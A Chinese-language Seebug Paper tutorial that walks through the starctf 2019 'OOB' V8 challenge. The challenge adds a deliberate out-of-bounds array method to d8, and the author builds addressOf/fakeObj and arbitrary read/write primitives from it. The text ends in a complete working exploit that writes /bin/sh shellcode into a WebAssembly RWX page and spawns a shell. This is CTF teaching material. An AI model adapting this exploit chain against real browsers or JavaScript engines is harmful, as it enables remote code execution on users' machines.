**作者：Hcamael@知道创宇404实验室**

**相关阅读：[从 0 开始学 V8 漏洞利用之环境搭建（一）](https://paper.seebug.org/1820/ "从 0 开始学 V8
漏洞利用之环境搭建（一）")  
[从 0 开始学 V8 漏洞利用之 V8 通用利用链（二）](https://paper.seebug.org/1821/ "从 0 开始学 V8
漏洞利用之 V8 通用利用链（二）")**

我是从starctf 2019的一道叫OOB的题目开始入门的，首先来讲讲这道题。

FreeBuf上有一篇《从一道CTF题零基础学V8漏洞利用》，我觉得对初学者挺友好的，我就是根据这篇文章开始入门v8的漏洞利用。

# 环境搭建

    
    
    $ git clone https://github.com/sixstars/starctf2019.git
    $ cd v8
    $ git reset --hard 6dc88c191f5ecc5389dc26efa3ca0907faef3598
    $ git apply ../starctf2019/pwn-OOB/oob.diff
    $ gclient sync -D
    $ gn gen out/x64_startctf.release --args='v8_monolithic=true v8_use_external_startup_data=false is_component_build=false is_debug=false target_cpu="x64" use_goma=false goma_dir="None" v8_enable_backtrace=true v8_enable_disassembler=true v8_enable_object_print=true v8_enable_verify_heap=true'
    $ ninja -C out/x64_startctf.release d8

或者可以在我之前分享的`build.sh`中，在`git reset`命令后加一句`git apply ../starctf2019/pwn-OOB/oob.diff`，就能使用`build.sh 6dc88c191f5ecc5389dc26efa3ca0907faef3598
starctf2019`一键编译。

# 漏洞点

源码我就不分析了，因为这题是人为造洞，在obb.diff中，给变量添加了一个oob函数，这个函数可以越界读写64bit。来测试一下：

    
    
    $ cat test.js
    var f64 = new Float64Array(1);
    var bigUint64 = new BigUint64Array(f64.buffer);
    
    function ftoi(f)
    {
      f64[0] = f;
      return bigUint64[0];
    }
    
    function itof(i)
    {
        bigUint64[0] = i;
        return f64[0];
    }
    
    function hex(i)
    {
        return i.toString(16).padStart(8, "0");
    }
    
    var a = [2.1];
    var x = a.oob();
    console.log("x is 0x"+hex(ftoi(x)));
    %DebugPrint(a);
    %SystemBreak();
    a.oob(2.1);
    %SystemBreak();

使用gdb进行调试，得到输出：

    
    
    x is 0x16c2a4382ed9
    0x242d7b60e041 <JSArray[1]>

可能是因为v8的版本太低了，在这个版本的时候`DebugPrint`命令只会输出变量的地址，不会输出其结构，我们可以使用job来查看其结构：

    
    
    pwndbg> job 0x242d7b60e041
    0x242d7b60e041: [JSArray]
     - map: 0x16c2a4382ed9 <Map(PACKED_DOUBLE_ELEMENTS)> [FastProperties]
     - prototype: 0x15ae01091111 <JSArray[0]>
     - elements: 0x242d7b60e029 <FixedDoubleArray[1]> [PACKED_DOUBLE_ELEMENTS]
     - length: 1
     - properties: 0x061441340c71 <FixedArray[0]> {
        #length: 0x1b8f8e3c01a9 <AccessorInfo> (const accessor descriptor)
     }
     - elements: 0x242d7b60e029 <FixedDoubleArray[1]> {
               0: 2.1
     }
    pwndbg> x/8gx 0x242d7b60e029-1
    0x242d7b60e028: 0x00000614413414f9 0x0000000100000000
    0x242d7b60e038: 0x4000cccccccccccd 0x000016c2a4382ed9
    0x242d7b60e048: 0x0000061441340c71 0x0000242d7b60e029
    0x242d7b60e058: 0x0000000100000000 0x0000061441340561

我们能发现，x的值为变量a的map地址。浮点型数组的结构之前的文章说了，在value之后就是该变量的结构内存区域，所以使用`a.oob()`可以越界读64bit，就可以读写该变量的map地址，并且在该版本中，地址并没有被压缩，是64bit。

我们继续运行代码：

    
    
    pwndbg> x/8gx 0x242d7b60e029-1
    0x242d7b60e028: 0x00000614413414f9 0x0000000100000000
    0x242d7b60e038: 0x4000cccccccccccd 0x4000cccccccccccd
    0x242d7b60e048: 0x0000061441340c71 0x0000242d7b60e029
    0x242d7b60e058: 0x0000000100000000 0x0000061441340561

发现通过`a.oob(2.1);`可以越界写64bit，已经把变量`a`的map地址改为了`2.1`。

# 套模版写exp

想想我上篇文章说的模板，我们来套模板写exp。

## 编写addressOf函数

首先我们来写`addressOf`函数，该函数的功能是，通过把obj数组的map地址改为浮点型数组的map地址，来泄漏任意变量的地址。

所以我们可以这么写：

    
    
    var double_array = [1.1];
    var obj = {"a" : 1};
    var obj_array = [obj];
    var array_map = double_array.oob();
    var obj_map = obj_array.oob();
    
    function addressOf(obj_to_leak)
    {
        obj_array[0] = obj_to_leak;
        obj_array.oob(array_map); // 把obj数组的map地址改为浮点型数组的map地址
        let obj_addr = ftoi(obj_array[0]) - 1n;
        obj_array.oob(obj_map); // 把obj数组的map地址改回来，以便后续使用
        return obj_addr;
    }

## 编写fakeObj函数

接下来编写一下`fakeObj`函数，该函数的功能是把浮点型数组的map地址改为对象数组的map地址，可以伪造出一个对象来，所以我们可以这么写：

    
    
    function fakeObj(addr_to_fake)
    {
        double_array[0] = itof(addr_to_fake + 1n);
        double_array.oob(obj_map);  // 把浮点型数组的map地址改为对象数组的map地址
        let faked_obj = double_array[0];
        double_array.oob(array_map); // 改回来，以便后续需要的时候使用
        return faked_obj;
    }

## 完整的exp

好了，把模板中空缺的部分都补充完了，但是还有一个问题。因为模板是按照新版的v8来写的，新版的v8对地址都进行了压缩，但是该题的v8缺没有对地址进行压缩，所以还有一些地方需要进行调整：

首先是读写函数，因为map地址占64bit，长度占64bit，所以`elements`的地址位于`value-0x10`，所以读写函数需要进行微调：

    
    
    function read64(addr)
    {
        fake_array[2] = itof(addr - 0x10n + 0x1n);
        return fake_object[0];
    }
    
    function write64(addr, data)
    {
        fake_array[2] = itof(addr - 0x10n + 0x1n);
        fake_object[0] = itof(data);
    }

`copy_shellcode_to_rwx`函数也要进行相关的调整：

    
    
    function copy_shellcode_to_rwx(shellcode, rwx_addr)
    {
      var data_buf = new ArrayBuffer(shellcode.length * 8);
      var data_view = new DataView(data_buf);
      var buf_backing_store_addr = addressOf(data_buf) + 0x20n;
      console.log("buf_backing_store_addr: 0x"+hex(buf_backing_store_addr));
    
      write64(buf_backing_store_addr, ftoi(rwx_addr));
      for (let i = 0; i < shellcode.length; ++i)
        data_view.setFloat64(i * 8, itof(shellcode[i]), true);
    }

`fake_array`也需要进行修改：

    
    
    var fake_array = [
        array_map,
        itof(0n),
        itof(0x41414141n),
        itof(0x100000000n),
    ];

计算`fake_object_addr`地址的偏移需要稍微改改：

    
    
    fake_array_addr = addressOf(fake_array);
    console.log("[*] leak fake_array addr: 0x" + hex(fake_array_addr));
    fake_object_addr = fake_array_addr + 0x30n;
    var fake_object = fakeObj(fake_object_addr);

获取`rwx_addr`的过程需要稍微改一改偏移：

    
    
    var wasm_instance_addr = addressOf(wasmInstance);
    console.log("[*] leak wasm_instance addr: 0x" + hex(wasm_instance_addr));
    var rwx_page_addr = read64(wasm_instance_addr + 0x88n);
    console.log("[*] leak rwx_page_addr: 0x" + hex(ftoi(rwx_page_addr)));

偏移改完了，可以整合一下了，最后的exp如下：

    
    
    var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
    var wasmModule = new WebAssembly.Module(wasmCode);
    var wasmInstance = new WebAssembly.Instance(wasmModule, {});
    var f = wasmInstance.exports.main;
    
    var f64 = new Float64Array(1);
    var bigUint64 = new BigUint64Array(f64.buffer);
    
    function ftoi(f)
    {
      f64[0] = f;
        return bigUint64[0];
    }
    function itof(i)
    {
        bigUint64[0] = i;
        return f64[0];
    }
    function hex(i)
    {
        return i.toString(16).padStart(8, "0");
    }
    
    function fakeObj(addr_to_fake)
    {
        double_array[0] = itof(addr_to_fake + 1n);
        double_array.oob(obj_map);  // 把浮点型数组的map地址改为对象数组的map地址
        let faked_obj = double_array[0];
        double_array.oob(array_map); // 改回来，以便后续需要的时候使用
        return faked_obj;
    }
    
    function addressOf(obj_to_leak)
    {
        obj_array[0] = obj_to_leak;
        obj_array.oob(array_map); // 把obj数组的map地址改为浮点型数组的map地址
        let obj_addr = ftoi(obj_array[0]) - 1n;
        obj_array.oob(obj_map); // 把obj数组的map地址改回来，以便后续使用
        return obj_addr;
    }
    
    function read64(addr)
    {
        fake_array[2] = itof(addr - 0x10n + 0x1n);
        return fake_object[0];
    }
    
    function write64(addr, data)
    {
        fake_array[2] = itof(addr - 0x10n + 0x1n);
        fake_object[0] = itof(data);
    }
    
    function copy_shellcode_to_rwx(shellcode, rwx_addr)
    {
      var data_buf = new ArrayBuffer(shellcode.length * 8);
      var data_view = new DataView(data_buf);
      var buf_backing_store_addr = addressOf(data_buf) + 0x20n;
      console.log("[*] buf_backing_store_addr: 0x"+hex(buf_backing_store_addr));
    
      write64(buf_backing_store_addr, ftoi(rwx_addr));
      for (let i = 0; i < shellcode.length; ++i)
        data_view.setFloat64(i * 8, itof(shellcode[i]), true);
    }
    
    var double_array = [1.1];
    var obj = {"a" : 1};
    var obj_array = [obj];
    var array_map = double_array.oob();
    var obj_map = obj_array.oob();
    
    var fake_array = [
        array_map,
        itof(0n),
        itof(0x41414141n),
        itof(0x100000000n),
    ];
    
    fake_array_addr = addressOf(fake_array);
    console.log("[*] leak fake_array addr: 0x" + hex(fake_array_addr));
    fake_object_addr = fake_array_addr + 0x30n;
    var fake_object = fakeObj(fake_object_addr);
    
    var wasm_instance_addr = addressOf(wasmInstance);
    console.log("[*] leak wasm_instance addr: 0x" + hex(wasm_instance_addr));
    var rwx_page_addr = read64(wasm_instance_addr + 0x88n);
    console.log("[*] leak rwx_page_addr: 0x" + hex(ftoi(rwx_page_addr)));
    
    var shellcode = [
      0x2fbb485299583b6an,
      0x5368732f6e69622fn,
      0x050f5e5457525f54n
    ];
    
    copy_shellcode_to_rwx(shellcode, rwx_page_addr);
    f();

执行exp：

    
    
    $ ./d8 exp.js
    [*] leak fake_array addr: 0x8ff3db506f8
    [*] leak wasm_instance addr: 0x33312a9e0fd0
    [*] leak rwx_page_addr: 0xfc5ec3c6000
    [*] buf_backing_store_addr: 0x8ff3db50c10
    $ id
    uid=1000(ubuntu) gid=1000(ubuntu)

# 参考

  1. <https://www.freebuf.com/vuls/203721.html>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1822/>

